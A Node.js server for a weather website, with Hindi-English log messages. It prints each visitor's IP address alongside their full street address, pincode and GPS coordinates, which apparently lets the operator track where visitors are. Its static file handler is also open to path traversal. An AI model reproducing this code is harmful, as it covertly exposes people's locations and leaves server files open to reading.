const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;

const MIME = {
  '.html': 'text/html',
  '.js': 'text/javascript',
  '.css': 'text/css',
  '.json': 'application/json'
};

function color(txt, code) {
  return `\x1b[${code}m${txt}\x1b[0m`;
}

function logBanner() {
  console.log(color('\n================ WEATHER SITE - LIVE ACTIVITY ================', 36));
  console.log(color(`Server chal raha hai: http://localhost:${PORT}`, 32));
  console.log(color('================================================================\n', 36));
}

function logActivity(data, ip) {
  const time = new Date().toLocaleString('en-IN', { hour12: true });
  console.log(color(`\n[${time}] NAYA VISITOR (${ip})`, 33));
  if (data.location) {
    const l = data.location;
    console.log(color(`  Address  : ${l.fullAddress}`, 36));
    if (l.road) console.log(color(`  Road     : ${l.road}`, 36));
    if (l.area) console.log(color(`  Area     : ${l.area}`, 36));
    if (l.city) console.log(color(`  City     : ${l.city}`, 36));
    if (l.state) console.log(color(`  State    : ${l.state}`, 36));
    if (l.postcode) console.log(color(`  Pincode  : ${l.postcode}`, 36));
    if (l.country) console.log(color(`  Country  : ${l.country}`, 36));
    console.log(color(`  Coords   : ${l.lat}, ${l.lon}  (accuracy: ${l.accuracy})`, 36));
  }
  if (data.weather) {
    const w = data.weather;
    console.log(color(`  Temp     : ${w.temp}°C  (feels ${w.feels}°)`, 32));
    console.log(color(`  Mausam   : ${w.desc}`, 32));
    console.log(color(`  Humidity : ${w.humidity}%   Hawa: ${w.wind} km/h`, 32));
    if (w.forecast) {
      console.log(color(`  Forecast : ${w.forecast}`, 35));
    }
  }
  if (data.event) {
    console.log(color(`  Event    : ${data.event}`, 90));
  }
  console.log(color('----------------------------------------------------------------', 90));
}

const server = http.createServer((req, res) => {
  const ip = req.socket.remoteAddress;

  if (req.method === 'POST' && req.url === '/log') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body || '{}');
        logActivity(data, ip);
      } catch (e) {
        console.log(color('Activity data parse nahi hui: ' + e.message, 31));
      }
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ ok: true }));
    });
    return;
  }

  let filePath = req.url === '/' ? '/index.html' : req.url;
  filePath = path.join(__dirname, filePath.split('?')[0]);

  fs.readFile(filePath, (err, content) => {
    if (err) {
      res.writeHead(404);
      res.end('Not found');
      return;
    }
    const ext = path.extname(filePath);
    res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
    res.end(content);
  });
});

server.listen(PORT, () => {
  logBanner();
});
